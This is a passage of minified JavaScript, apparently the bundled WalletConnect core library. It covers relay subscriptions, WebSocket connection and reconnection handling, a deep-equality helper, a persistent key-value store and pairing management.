this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:n}),this.relayer.request(n)}onSubscribe(e,t){this.setSubscription(e,pI(Mb({},t),{id:e})),this.pending.delete(t.topic)}onBatchSubscribe(e){e.length&&e.forEach(t=>{this.setSubscription(t.id,Mb({},t)),this.pending.delete(t.topic)})}async onUnsubscribe(e,t,i){this.events.removeAllListeners(t),this.hasSubscription(t,e)&&this.deleteSubscription(t,i),await this.relayer.messages.del(e)}async setRelayerSubscriptions(e){await this.relayer.core.storage.setItem(this.storageKey,e)}async getRelayerSubscriptions(){return await this.relayer.core.storage.getItem(this.storageKey)}setSubscription(e,t){this.logger.debug("Setting subscription"),this.logger.trace({type:"method",method:"setSubscription",id:e,subscription:t}),this.addSubscription(e,t)}addSubscription(e,t){this.subscriptions.set(e,Mb({},t)),this.topicMap.set(t.topic,e),this.events.emit(Xa.created,t)}getSubscription(e){this.logger.debug("Getting subscription"),this.logger.trace({type:"method",method:"getSubscription",id:e});const t=this.subscriptions.get(e);if(!t){const{message:i}=ot("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(i)}return t}deleteSubscription(e,t){this.logger.debug("Deleting subscription"),this.logger.trace({type:"method",method:"deleteSubscription",id:e,reason:t});const i=this.getSubscription(e);this.subscriptions.delete(e),this.topicMap.delete(i.topic,e),this.events.emit(Xa.deleted,pI(Mb({},i),{reason:t}))}async persist(){await this.setRelayerSubscriptions(this.values),this.events.emit(Xa.sync)}async onRestart(){if(this.cached.length){const e=[...this.cached],t=Math.ceil(this.cached.length/this.batchSubscribeTopicsLimit);for(let i=0;i<t;i++){const n=e.splice(0,this.batchSubscribeTopicsLimit);await this.batchSubscribe(n)}}this.events.emit(Xa.resubscribed)}async restore(){try{const e=await this.getRelayerSubscriptions();if(typeof e>"u"||!e.length)return;if(this.subscriptions.size){const{message:t}=ot("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(t),this.logger.error(`${this.name}: ${JSON.stringify(this.values)}`),new Error(t)}this.cached=e,this.logger.debug(`Successfully Restored subscriptions for ${this.name}`),this.logger.trace({type:"method",method:"restore",subscriptions:this.values})}catch(e){this.logger.debug(`Failed to Restore subscriptions for ${this.name}`),this.logger.error(e)}}async batchSubscribe(e){e.length&&(await this.rpcBatchSubscribe(e),this.onBatchSubscribe(await Promise.all(e.map(async t=>pI(Mb({},t),{id:await this.getSubscriptionId(t.topic)})))))}async batchFetchMessages(e){if(!e.length)return;this.logger.trace(`Fetching batch messages for ${e.length} subscriptions`);const t=await this.rpcBatchFetchMessages(e);t&&t.messages&&(await _Ue(fe.toMiliseconds(fe.ONE_SECOND)),await this.relayer.handleBatchMessageEvents(t.messages))}async onConnect(){await this.restart(),this.reset()}onDisconnect(){this.onDisable()}isInitialized(){if(!this.initialized){const{message:e}=ot("NOT_INITIALIZED",this.name);throw new Error(e)}}async restartToComplete(e){!this.relayer.connected&&!this.relayer.connecting&&(this.cached.push(e),await this.relayer.transportOpen())}async getClientId(){return this.clientId||(this.clientId=await this.relayer.core.crypto.getClientId()),this.clientId}async getSubscriptionId(e){return ad(e+await this.getClientId())}};var dVe=Object.defineProperty,WW=Object.getOwnPropertySymbols,hVe=Object.prototype.hasOwnProperty,fVe=Object.prototype.propertyIsEnumerable,zN=(r,e,t)=>e in r?dVe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,HW=(r,e)=>{for(var t in e||(e={}))hVe.call(e,t)&&zN(r,t,e[t]);if(WW)for(var t of WW(e))fVe.call(e,t)&&zN(r,t,e[t]);return r},fi=(r,e,t)=>zN(r,typeof e!="symbol"?e+"":e,t);let pVe=class extends Cze{constructor(e){super(e),fi(this,"protocol","wc"),fi(this,"version",2),fi(this,"core"),fi(this,"logger"),fi(this,"events",new en.EventEmitter),fi(this,"provider"),fi(this,"messages"),fi(this,"subscriber"),fi(this,"publisher"),fi(this,"name",Wze),fi(this,"transportExplicitlyClosed",!1),fi(this,"initialized",!1),fi(this,"connectionAttemptInProgress",!1),fi(this,"relayUrl"),fi(this,"projectId"),fi(this,"packageName"),fi(this,"bundleId"),fi(this,"hasExperiencedNetworkDisruption",!1),fi(this,"pingTimeout"),fi(this,"heartBeatTimeout",fe.toMiliseconds(fe.THIRTY_SECONDS+fe.FIVE_SECONDS)),fi(this,"reconnectTimeout"),fi(this,"connectPromise"),fi(this,"reconnectInProgress",!1),fi(this,"requestsInFlight",[]),fi(this,"connectTimeout",fe.toMiliseconds(fe.ONE_SECOND*15)),fi(this,"request",async t=>{var i,n;this.logger.debug("Publishing Request Payload");const s=t.id||Cs().toString();await this.toEstablishConnection();try{this.logger.trace({id:s,method:t.method,topic:(i=t.params)==null?void 0:i.topic},"relayer.request - publishing...");const o=`${s}:${((n=t.params)==null?void 0:n.tag)||""}`;this.requestsInFlight.push(o);const a=await this.provider.request(t);return this.requestsInFlight=this.requestsInFlight.filter(c=>c!==o),a}catch(o){throw this.logger.debug(`Failed to Publish Request: ${s}`),o}}),fi(this,"resetPingTimeout",()=>{Z7()&&(clearTimeout(this.pingTimeout),this.pingTimeout=setTimeout(()=>{var t,i,n,s;try{this.logger.debug({},"pingTimeout: Connection stalled, terminating..."),(s=(n=(i=(t=this.provider)==null?void 0:t.connection)==null?void 0:i.socket)==null?void 0:n.terminate)==null||s.call(n)}catch(o){this.logger.warn(o,o?.message)}},this.heartBeatTimeout))}),fi(this,"onPayloadHandler",t=>{this.onProviderPayload(t),this.resetPingTimeout()}),fi(this,"onConnectHandler",()=>{this.logger.warn({},"Relayer connected "),this.startPingTimeout(),this.events.emit(Fs.connect)}),fi(this,"onDisconnectHandler",()=>{this.logger.warn({},"Relayer disconnected "),this.requestsInFlight=[],this.onProviderDisconnect()}),fi(this,"onProviderErrorHandler",t=>{this.logger.fatal(`Fatal socket error: ${t.message}`),this.events.emit(Fs.error,t),this.logger.fatal("Fatal socket error received, closing transport"),this.transportClose()}),fi(this,"registerProviderListeners",()=>{this.provider.on(Lc.payload,this.onPayloadHandler),this.provider.on(Lc.connect,this.onConnectHandler),this.provider.on(Lc.disconnect,this.onDisconnectHandler),this.provider.on(Lc.error,this.onProviderErrorHandler)}),this.core=e.core,this.logger=typeof e.logger<"u"&&typeof e.logger!="string"?gr(e.logger,this.name):Iu(ra({level:e.logger||zze})),this.messages=new ZHe(this.logger,e.core),this.subscriber=new uVe(this,this.logger),this.publisher=new tVe(this,this.logger),this.relayUrl=e?.relayUrl||iie,this.projectId=e.projectId,cUe()?this.packageName=Uz():lUe()&&(this.bundleId=Uz()),this.provider={}}async init(){this.logger.trace("Initialized"),this.registerEventListeners(),await Promise.all([this.messages.init(),this.subscriber.init()]),this.initialized=!0,this.transportOpen().catch(e=>this.logger.warn(e,e?.message))}get context(){return Or(this.logger)}get connected(){var e,t,i;return((i=(t=(e=this.provider)==null?void 0:e.connection)==null?void 0:t.socket)==null?void 0:i.readyState)===1||!1}get connecting(){var e,t,i;return((i=(t=(e=this.provider)==null?void 0:e.connection)==null?void 0:t.socket)==null?void 0:i.readyState)===0||this.connectPromise!==void 0||!1}async publish(e,t,i){this.isInitialized(),await this.publisher.publish(e,t,i),await this.recordMessageEvent({topic:e,message:t,publishedAt:Date.now(),transportType:fn.relay},x9.outbound)}async subscribe(e,t){var i,n,s;this.isInitialized(),(!(t!=null&&t.transportType)||t?.transportType==="relay")&&await this.toEstablishConnection();const o=typeof((i=t?.internal)==null?void 0:i.throwOnFailedPublish)>"u"?!0:(n=t?.internal)==null?void 0:n.throwOnFailedPublish;let a=((s=this.subscriber.topicMap.get(e))==null?void 0:s[0])||"",c;const l=u=>{u.topic===e&&(this.subscriber.off(Xa.created,l),c())};return await Promise.all([new Promise(u=>{c=u,this.subscriber.on(Xa.created,l)}),new Promise(async(u,d)=>{a=await this.subscriber.subscribe(e,HW({internal:{throwOnFailedPublish:o}},t)).catch(h=>{o&&d(h)})||a,u()})]),a}async unsubscribe(e,t){this.isInitialized(),await this.subscriber.unsubscribe(e,t)}on(e,t){this.events.on(e,t)}once(e,t){this.events.once(e,t)}off(e,t){this.events.off(e,t)}removeListener(e,t){this.events.removeListener(e,t)}async transportDisconnect(){this.provider.disconnect&&(this.hasExperiencedNetworkDisruption||this.connected)?await Mf(this.provider.disconnect(),2e3,"provider.disconnect()").catch(()=>this.onProviderDisconnect()):this.onProviderDisconnect()}async transportClose(){this.transportExplicitlyClosed=!0,await this.transportDisconnect()}async transportOpen(e){if(!this.subscriber.hasAnyTopics){this.logger.info("Starting WS connection skipped because the client has no topics to work with.");return}if(this.connectPromise?(this.logger.debug({},"Waiting for existing connection attempt to resolve..."),await this.connectPromise,this.logger.debug({},"Existing connection attempt resolved")):(this.connectPromise=new Promise(async(t,i)=>{await this.connect(e).then(t).catch(i).finally(()=>{this.connectPromise=void 0})}),await this.connectPromise),!this.connected)throw new Error(`Couldn't establish socket connection to the relay server: ${this.relayUrl}`)}async restartTransport(e){this.logger.debug({},"Restarting transport..."),!this.connectionAttemptInProgress&&(this.relayUrl=e||this.relayUrl,await this.confirmOnlineStateOrThrow(),await this.transportClose(),await this.transportOpen())}async confirmOnlineStateOrThrow(){if(!await kW())throw new Error("No internet connection detected. Please restart your network and try again.")}async handleBatchMessageEvents(e){if(e?.length===0){this.logger.trace("Batch message events is empty. Ignoring...");return}const t=e.sort((i,n)=>i.publishedAt-n.publishedAt);this.logger.debug(`Batch of ${t.length} message events sorted`);for(const i of t)try{await this.onMessageEvent(i)}catch(n){this.logger.warn(n,"Error while processing batch message event: "+n?.message)}this.logger.trace(`Batch of ${t.length} message events processed`)}async onLinkMessageEvent(e,t){const{topic:i}=e;if(!t.sessionExists){const n=ws(fe.FIVE_MINUTES),s={topic:i,expiry:n,relay:{protocol:"irn"},active:!1};await this.core.pairing.pairings.set(i,s)}this.events.emit(Fs.message,e),await this.recordMessageEvent(e,x9.inbound)}async connect(e){await this.confirmOnlineStateOrThrow(),e&&e!==this.relayUrl&&(this.relayUrl=e,await this.transportDisconnect()),this.connectionAttemptInProgress=!0,this.transportExplicitlyClosed=!1;let t=1;for(;t<6;){try{if(this.transportExplicitlyClosed)break;this.logger.debug({},`Connecting to ${this.relayUrl}, attempt: ${t}...`),await this.createProvider(),await new Promise(async(i,n)=>{const s=()=>{n(new Error("Connection interrupted while trying to connect"))};this.provider.once(Lc.disconnect,s),await Mf(new Promise((o,a)=>{this.provider.connect().then(o).catch(a)}),this.connectTimeout,`Socket stalled when trying to connect to ${this.relayUrl}`).catch(o=>{n(o)}).finally(()=>{this.provider.off(Lc.disconnect,s),clearTimeout(this.reconnectTimeout)}),await new Promise(async(o,a)=>{const c=()=>{n(new Error("Connection interrupted while trying to subscribe"))};this.provider.once(Lc.disconnect,c),await this.subscriber.start().then(o).catch(a).finally(()=>{this.provider.off(Lc.disconnect,c)})}),this.hasExperiencedNetworkDisruption=!1,i()})}catch(i){await this.subscriber.stop();const n=i;this.logger.warn({},n.message),this.hasExperiencedNetworkDisruption=!0}finally{this.connectionAttemptInProgress=!1}if(this.connected){this.logger.debug({},`Connected to ${this.relayUrl} successfully on attempt: ${t}`);break}await new Promise(i=>setTimeout(i,fe.toMiliseconds(t*1))),t++}}startPingTimeout(){var e,t,i,n,s;if(Z7())try{(t=(e=this.provider)==null?void 0:e.connection)!=null&&t.socket&&((s=(n=(i=this.provider)==null?void 0:i.connection)==null?void 0:n.socket)==null||s.on("ping",()=>{this.resetPingTimeout()})),this.resetPingTimeout()}catch(o){this.logger.warn(o,o?.message)}}async createProvider(){this.provider.connection&&this.unregisterProviderListeners();const e=await this.core.crypto.signJWT(this.relayUrl);this.provider=new Vr(new vR(pUe({sdkVersion:DN,protocol:this.protocol,version:this.version,relayUrl:this.relayUrl,projectId:this.projectId,auth:e,useOnCloseEvent:!0,bundleId:this.bundleId,packageName:this.packageName}))),this.registerProviderListeners()}async recordMessageEvent(e,t){const{topic:i,message:n}=e;await this.messages.set(i,n,t)}async shouldIgnoreMessageEvent(e){const{topic:t,message:i}=e;if(!i||i.length===0)return this.logger.warn(`Ignoring invalid/empty message: ${i}`),!0;if(!await this.subscriber.isKnownTopic(t))return this.logger.warn(`Ignoring message for unknown topic ${t}`),!0;const n=this.messages.has(t,i);return n&&this.logger.warn(`Ignoring duplicate message: ${i}`),n}async onProviderPayload(e){if(this.logger.debug("Incoming Relay Payload"),this.logger.trace({type:"payload",direction:"incoming",payload:e}),N0(e)){if(!e.method.endsWith(Hze))return;const t=e.params,{topic:i,message:n,publishedAt:s,attestation:o}=t.data,a={topic:i,message:n,publishedAt:s,transportType:fn.relay,attestation:o};this.logger.debug("Emitting Relayer Payload"),this.logger.trace(HW({type:"event",event:t.id},a)),this.events.emit(t.id,a),await this.acknowledgePayload(e),await this.onMessageEvent(a)}else Jd(e)&&this.events.emit(Fs.message_ack,e)}async onMessageEvent(e){await this.shouldIgnoreMessageEvent(e)||(await this.recordMessageEvent(e,x9.inbound),this.events.emit(Fs.message,e))}async acknowledgePayload(e){const t=bl(e.id,!0);await this.provider.connection.send(t)}unregisterProviderListeners(){this.provider.off(Lc.payload,this.onPayloadHandler),this.provider.off(Lc.connect,this.onConnectHandler),this.provider.off(Lc.disconnect,this.onDisconnectHandler),this.provider.off(Lc.error,this.onProviderErrorHandler),clearTimeout(this.pingTimeout)}async registerEventListeners(){let e=await kW();tze(async t=>{e!==t&&(e=t,t?await this.transportOpen().catch(i=>this.logger.error(i,i?.message)):(this.hasExperiencedNetworkDisruption=!0,await this.transportDisconnect(),this.transportExplicitlyClosed=!1))}),this.core.heartbeat.on(Ks.pulse,async()=>{if(!this.transportExplicitlyClosed&&!this.connected&&nze())try{await this.confirmOnlineStateOrThrow(),await this.transportOpen()}catch(t){this.logger.warn(t,t?.message)}})}async onProviderDisconnect(){clearTimeout(this.pingTimeout),this.events.emit(Fs.disconnect),this.connectionAttemptInProgress=!1,!this.reconnectInProgress&&(this.reconnectInProgress=!0,await this.subscriber.stop(),this.subscriber.hasAnyTopics&&(this.transportExplicitlyClosed||(this.reconnectTimeout=setTimeout(async()=>{await this.transportOpen().catch(e=>this.logger.error(e,e?.message)),this.reconnectTimeout=void 0,this.reconnectInProgress=!1},fe.toMiliseconds(Vze)))))}isInitialized(){if(!this.initialized){const{message:e}=ot("NOT_INITIALIZED",this.name);throw new Error(e)}}async toEstablishConnection(){if(await this.confirmOnlineStateOrThrow(),!this.connected){if(this.connectPromise){await this.connectPromise;return}await this.connect()}}};function gVe(r,e){return r===e||Number.isNaN(r)&&Number.isNaN(e)}function VW(r){return Object.getOwnPropertySymbols(r).filter(e=>Object.prototype.propertyIsEnumerable.call(r,e))}function KW(r){return r==null?r===void 0?"[object Undefined]":"[object Null]":Object.prototype.toString.call(r)}const mVe="[object RegExp]",wVe="[object String]",bVe="[object Number]",vVe="[object Boolean]",GW="[object Arguments]",yVe="[object Symbol]",xVe="[object Date]",CVe="[object Map]",EVe="[object Set]",_Ve="[object Array]",SVe="[object Function]",AVe="[object ArrayBuffer]",gI="[object Object]",IVe="[object Error]",TVe="[object DataView]",kVe="[object Uint8Array]",NVe="[object Uint8ClampedArray]",PVe="[object Uint16Array]",$Ve="[object Uint32Array]",RVe="[object BigUint64Array]",OVe="[object Int8Array]",BVe="[object Int16Array]",MVe="[object Int32Array]",DVe="[object BigInt64Array]",LVe="[object Float32Array]",UVe="[object Float64Array]";function jVe(){}function ZW(r){if(!r||typeof r!="object")return!1;const e=Object.getPrototypeOf(r);return e===null||e===Object.prototype||Object.getPrototypeOf(e)===null?Object.prototype.toString.call(r)==="[object Object]":!1}function FVe(r,e,t){return l5(r,e,void 0,void 0,void 0,void 0,t)}function l5(r,e,t,i,n,s,o){const a=o(r,e,t,i,n,s);if(a!==void 0)return a;if(typeof r==typeof e)switch(typeof r){case"bigint":case"string":case"boolean":case"symbol":case"undefined":return r===e;case"number":return r===e||Object.is(r,e);case"function":return r===e;case"object":return z5(r,e,s,o)}return z5(r,e,s,o)}function z5(r,e,t,i){if(Object.is(r,e))return!0;let n=KW(r),s=KW(e);if(n===GW&&(n=gI),s===GW&&(s=gI),n!==s)return!1;switch(n){case wVe:return r.toString()===e.toString();case bVe:{const c=r.valueOf(),l=e.valueOf();return gVe(c,l)}case vVe:case xVe:case yVe:return Object.is(r.valueOf(),e.valueOf());case mVe:return r.source===e.source&&r.flags===e.flags;case SVe:return r===e}t=t??new Map;const o=t.get(r),a=t.get(e);if(o!=null&&a!=null)return o===e;t.set(r,e),t.set(e,r);try{switch(n){case CVe:{if(r.size!==e.size)return!1;for(const[c,l]of r.entries())if(!e.has(c)||!l5(l,e.get(c),c,r,e,t,i))return!1;return!0}case EVe:{if(r.size!==e.size)return!1;const c=Array.from(r.values()),l=Array.from(e.values());for(let u=0;u<c.length;u++){const d=c[u],h=l.findIndex(f=>l5(d,f,void 0,r,e,t,i));if(h===-1)return!1;l.splice(h,1)}return!0}case _Ve:case kVe:case NVe:case PVe:case $Ve:case RVe:case OVe:case BVe:case MVe:case DVe:case LVe:case UVe:{if(typeof Buffer<"u"&&Buffer.isBuffer(r)!==Buffer.isBuffer(e)||r.length!==e.length)return!1;for(let c=0;c<r.length;c++)if(!l5(r[c],e[c],c,r,e,t,i))return!1;return!0}case AVe:return r.byteLength!==e.byteLength?!1:z5(new Uint8Array(r),new Uint8Array(e),t,i);case TVe:return r.byteLength!==e.byteLength||r.byteOffset!==e.byteOffset?!1:z5(new Uint8Array(r),new Uint8Array(e),t,i);case IVe:return r.name===e.name&&r.message===e.message;case gI:{if(!(z5(r.constructor,e.constructor,t,i)||ZW(r)&&ZW(e)))return!1;const c=[...Object.keys(r),...VW(r)],l=[...Object.keys(e),...VW(e)];if(c.length!==l.length)return!1;for(let u=0;u<c.length;u++){const d=c[u],h=r[d];if(!Object.hasOwn(e,d))return!1;const f=e[d];if(!l5(h,f,d,r,e,t,i))return!1}return!0}default:return!1}}finally{t.delete(r),t.delete(e)}}function qVe(r,e){return FVe(r,e,jVe)}var zVe=Object.defineProperty,YW=Object.getOwnPropertySymbols,WVe=Object.prototype.hasOwnProperty,HVe=Object.prototype.propertyIsEnumerable,WN=(r,e,t)=>e in r?zVe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,JW=(r,e)=>{for(var t in e||(e={}))WVe.call(e,t)&&WN(r,t,e[t]);if(YW)for(var t of YW(e))HVe.call(e,t)&&WN(r,t,e[t]);return r},aa=(r,e,t)=>WN(r,typeof e!="symbol"?e+"":e,t);let C2=class extends Eze{constructor(e,t,i,n=Hd,s=void 0){super(e,t,i,n),this.core=e,this.logger=t,this.name=i,aa(this,"map",new Map),aa(this,"version",Kze),aa(this,"cached",[]),aa(this,"initialized",!1),aa(this,"getKey"),aa(this,"storagePrefix",Hd),aa(this,"recentlyDeleted",[]),aa(this,"recentlyDeletedLimit",200),aa(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(o=>{this.getKey&&o!==null&&!co(o)?this.map.set(this.getKey(o),o):$qe(o)?this.map.set(o.id,o):Rqe(o)&&this.map.set(o.topic,o)}),this.cached=[],this.initialized=!0)}),aa(this,"set",async(o,a)=>{this.isInitialized(),this.map.has(o)?await this.update(o,a):(this.logger.debug("Setting value"),this.logger.trace({type:"method",method:"set",key:o,value:a}),this.map.set(o,a),await this.persist())}),aa(this,"get",o=>(this.isInitialized(),this.logger.debug("Getting value"),this.logger.trace({type:"method",method:"get",key:o}),this.getData(o))),aa(this,"getAll",o=>(this.isInitialized(),o?this.values.filter(a=>Object.keys(o).every(c=>qVe(a[c],o[c]))):this.values)),aa(this,"update",async(o,a)=>{this.isInitialized(),this.logger.debug("Updating value"),this.logger.trace({type:"method",method:"update",key:o,update:a});const c=JW(JW({},this.getData(o)),a);this.map.set(o,c),await this.persist()}),aa(this,"delete",async(o,a)=>{this.isInitialized(),this.map.has(o)&&(this.logger.debug("Deleting value"),this.logger.trace({type:"method",method:"delete",key:o,reason:a}),this.map.delete(o),this.addToRecentlyDeleted(o),await this.persist())}),this.logger=gr(t,this.name),this.storagePrefix=n,this.getKey=s}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.map.size}get keys(){return Array.from(this.map.keys())}get values(){return Array.from(this.map.values())}addToRecentlyDeleted(e){this.recentlyDeleted.push(e),this.recentlyDeleted.length>=this.recentlyDeletedLimit&&this.recentlyDeleted.splice(0,this.recentlyDeletedLimit/2)}async setDataStore(e){await this.core.storage.setItem(this.storageKey,e)}async getDataStore(){return await this.core.storage.getItem(this.storageKey)}getData(e){const t=this.map.get(e);if(!t){if(this.recentlyDeleted.includes(e)){const{message:n}=ot("MISSING_OR_INVALID",`Record was recently deleted - ${this.name}: ${e}`);throw this.logger.error(n),new Error(n)}const{message:i}=ot("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.error(i),new Error(i)}return t}async persist(){await this.setDataStore(this.values)}async restore(){try{const e=await this.getDataStore();if(typeof e>"u"||!e.length)return;if(this.map.size){const{message:t}=ot("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(t),new Error(t)}this.cached=e,this.logger.debug(`Successfully Restored value for ${this.name}`),this.logger.trace({type:"method",method:"restore",value:this.values})}catch(e){this.logger.debug(`Failed to Restore value for ${this.name}`),this.logger.error(e)}}isInitialized(){if(!this.initialized){const{message:e}=ot("NOT_INITIALIZED",this.name);throw new Error(e)}}};var VVe=Object.defineProperty,KVe=(r,e,t)=>e in r?VVe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Kr=(r,e,t)=>KVe(r,typeof e!="symbol"?e+"":e,t);let GVe=class{constructor(e,t){this.core=e,this.logger=t,Kr(this,"name",Jze),Kr(this,"version",Qze),Kr(this,"events",new T0),Kr(this,"pairings"),Kr(this,"initialized",!1),Kr(this,"storagePrefix",Hd),Kr(this,"ignoredPayloadTypes",[r0]),Kr(this,"registeredMethods",[]),Kr(this,"init",async()=>{this.initialized||(await this.pairings.init(),await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.initialized=!0,this.logger.trace("Initialized"))}),Kr(this,"register",({methods:i})=>{this.isInitialized(),this.registeredMethods=[...new Set([...this.registeredMethods,...i])]}),Kr(this,"create",async i=>{this.isInitialized();const n=ON(),s=await this.core.crypto.setSymKey(n),o=ws(fe.FIVE_MINUTES),a={protocol:rie},c={topic:s,expiry:o,relay:a,active:!1,methods:i?.methods},l=yW({protocol:this.core.protocol,version:this.core.version,topic:s,symKey:n,relay:a,expiryTimestamp:o,methods:i?.methods});return this.events.emit(l1.create,c),this.core.expirer.set(s,o),await this.pairings.set(s,c),await this.core.relayer.subscribe(s,{transportType:i?.transportType}),{topic:s,uri:l}}),Kr(this,"pair",async i=>{this.isInitialized();const n=this.core.eventClient.createEvent({properties:{topic:i?.uri,trace:[td.pairing_started]}});this.isValidPair(i,n);const{topic:s,symKey:o,relay:a,expiryTimestamp:c,methods:l}=vW(i.uri);n.props.properties.topic=s,n.addTrace(td.pairing_uri_validation_success),n.addTrace(td.pairing_uri_not_expired);let u;if(this.pairings.keys.includes(s)){if(u=this.pairings.get(s),n.addTrace(td.existing_pairing),u.active)throw n.setError(Rh.active_pairing_already_exists),new Error(`Pairing already exists: ${s}. Please try again with a new connection URI.`);n.addTrace(td.pairing_not_expired)}const d=c||ws(fe.FIVE_MINUTES),h={topic:s,relay:a,expiry:d,active:!1,methods:l};this.core.expirer.set(s,d),await this.pairings.set(s,h),n.addTrace(td.store_new_pairing),i.activatePairing&&await this.activate({topic:s}),this.events.emit(l1.create,h),n.addTrace(td.emit_inactive_pairing),this.core.crypto.keychain.has(s)||await this.core.crypto.setSymKey(o,s),n.addTrace(td.subscribing_pairing_topic);try{await this.core.relayer.confirmOnlineStateOrThrow()}catch{n.setError(Rh.no_internet_connection)}try{await this.core.relayer.subscribe(s,{relay:a})}catch(f){throw n.setError(Rh.subscribe_pairing_topic_failure),f}return n.addTrace(td.subscribe_pairing_topic_success),h}),Kr(this,"activate",async({topic:i})=>{this.isInitialized();const n=ws(fe.FIVE_MINUTES);this.core.expirer.set(i,n),await this.pairings.update(i,{active:!0,expiry:n})}),Kr(this,"ping",async i=>{this.isInitialized(),await this.isValidPing(i),this.logger.warn("ping() is deprecated and will be removed in the next major release.");const{topic:n}=i;if(this.pairings.keys.includes(n)){const s=await this.sendRequest(n,"wc_pairingPing",{}),{done:o,resolve:a,reject:c}=t1();this.events.once(Ni("pairing_ping",s),({error:l})=>{l?c(l):a()}),await o()}}),Kr(this,"updateExpiry",async({topic:i,expiry:n})=>{this.isInitialized(),await this.pairings.update(i,{expiry:n})}),Kr(this,"updateMetadata",async({topic:i,metadata:n})=>{this.isInitialized(),await this.pairings.update(i,{peerMetadata:n})}),Kr(this,"getPairings",()=>(this.isInitialized(),this.pairings.values)),Kr(this,"disconnect",async i=>{this.isInitialized(),await this.isValidDisconnect(i);const{topic:n}=i;this.pairings.keys.includes(n)&&(await this.sendRequest(n,"wc_pairingDelete",gn("USER_DISCONNECTED")),await this.deletePairing(n))}),Kr(this,"formatUriFromPairing",i=>{this.isInitialized();const{topic:n,relay:s,expiry:o,methods:a}=i,c=this.core.crypto.keychain.get(n);return yW({protocol:this.core.protocol,version:this.core.version,topic:n,symKey:c,relay:s,expiryTimestamp:o,methods:a})}),Kr(this,"sendRequest",async(i,n,s)=>{const o=jn(n,s),a=await this.core.crypto.encode(i,o),c=Ob[n].req;return this.core.history.set(i,o),this.core.relayer.publish(i,a,c),o.id}),Kr(this,"sendResult",async(i,n,s)=>{const o=bl(i,s),a=await this.core.crypto.encode(n,o),c=(await this.core.history.get(n,i)).request.method,l=Ob[c].res;await this.core.relayer.publish(n,a,l),await this.core.history.resolve(o)}),Kr(this,"sendError",async(i,n,s)=>{const o=Ap(i,s),a=await this.core.crypto.encode(n,o),c=(await this.core.history.get(n,i)).request.method,l=Ob[c]?Ob[c].res:Ob.unregistered_method.res;await this.core.relayer.publish(n,a,l),await this.core.history.resolve(o)}),Kr(this,"deletePairing",async(i,n)=>{await this.core.relayer.unsubscribe(i),await Promise.all([this.pairings.delete(i,gn("USER_DISCONNECTED")),this.core.crypto.deleteSymKey(i),n?Promise.resolve():this.core.expirer.del(i)])}),Kr(this,"cleanup",async()=>{const i=this.pairings.getAll().filter(n=>xf(n.expiry));await Promise.all(i.map(n=>this.deletePairing(n.topic)))}),Kr(this,"onRelayEventRequest",async i=>{const{topic:n,payload:s}=i;switch(s.method){case"wc_pairingPing":return await this.onPairingPingRequest(n,s);case"wc_pairingDelete":return await this.onPairingDeleteRequest(n,s);default:return await this.onUnknownRpcMethodRequest(n,s)}}),Kr(this,"onRelayEventResponse",async i=>{const{topic:n,payload:s}=i,o=(await this.core.history.get(n,s.id)).request.method;switch(o){case"wc_pairingPing":return this.onPairingPingResponse(n,s);default:return this.onUnknownRpcMethodResponse(o)}}),Kr(this,"onPairingPingRequest",async(i,n)=>{const{id:s}=n;try{this.isValidPing({topic:i}),await this.sendResult(s,i,!0),this.events.emit(l1.ping,{id:s,topic:i})}catch(o){await this.sendError(s,i,o),this.logger.error(o)}}),Kr(this,"onPairingPingResponse",(i,n)=>{const{id:s}=n;setTimeout(()=>{Gi(n)?this.events.emit(Ni("pairing_ping",s),{}):wi(n)&&this.events.emit(Ni("pairing_ping",s),{error:n.error})},500)}),Kr(this,"onPairingDeleteRequest",async(i,n)=>{const{id:s}=n;try{this.isValidDisconnect({topic:i}),await this.deletePairing(i),this.events.emit(l1.delete,{id:s,topic:i})}catch(o){await this.sendError(s,i,o),this.logger.error(o)}}),Kr(this,"onUnknownRpcMethodRequest",async(i,n)=>{const{id:s,method:o}=n;try{if(this.registeredMethods.includes(o))return;const a=gn("WC_METHOD_UNSUPPORTED",o);await this.sendError(s,i,a),this.logger.error(a)}catch(a){await this.sendError(s,i,a),this.logger.error(a)}}),Kr(this,"onUnknownRpcMethodResponse",i=>{this.registeredMethods.includes(i)||this.logger.error(gn("WC_METHOD_UNSUPPORTED",i))}),Kr(this,"isValidPair",(i,n)=>{var s;if(!wa(i)){const{message:a}=ot("MISSING_OR_INVALID",`pair() params: ${i}`);throw n.setError(Rh.malformed_pairing_uri),new Error(a)}if(!Pqe(i.uri)){const{message:a}=ot("MISSING_OR_INVALID",`pair() uri: ${i.uri}`);throw n.setError(Rh.malformed_pairing_uri),new Error(a)}const o=vW(i?.uri);if(!((s=o?.relay)!=null&&s.protocol)){const{message:a}=ot("MISSING_OR_INVALID","pair() uri#relay-protocol");throw n.setError(Rh.malformed_pairing_uri),new Error(a)}if(!(o!=null&&o.symKey)){const{message:a}=ot("MISSING_OR_INVALID","pair() uri#symKey");throw n.setError(Rh.malformed_pairing_uri),new Error(a)}if(o!=null&&o.expiryTimestamp&&fe.toMiliseconds(o?.expiryTimestamp)<Date.now()){n.setError(Rh.pairing_expired);const{message:a}=ot("EXPIRED","pair() URI has expired. Please try again with a new connection URI.");throw new Error(a)}}),Kr(this,"isValidPing",async i=>{if(!wa(i)){const{message:s}=ot("MISSING_OR_INVALID",`ping() params: ${i}`);throw new Error(s)}const{topic:n}=i;await this.isValidPairingTopic(n)}),Kr(this,"isValidDisconnect",async i=>{if(!wa(i)){const{message:s}=ot("MISSING_OR_INVALID",`disconnect() params: ${i}`);throw new Error(s)}const{topic:n}=i;await this.isValidPairingTopic(n)}),Kr(this,"isValidPairingTopic",async i=>{if(!ls(i,!1)){const{message:n}=ot("MISSING_OR_INVALID",`pairing topic should be a string: ${i}`);throw new Error(n)}if(!this.pairings.keys.includes(i)){const{message:n}=ot("NO_MATCHING_KEY",`pairing topic doesn't exist: ${i}`);throw new 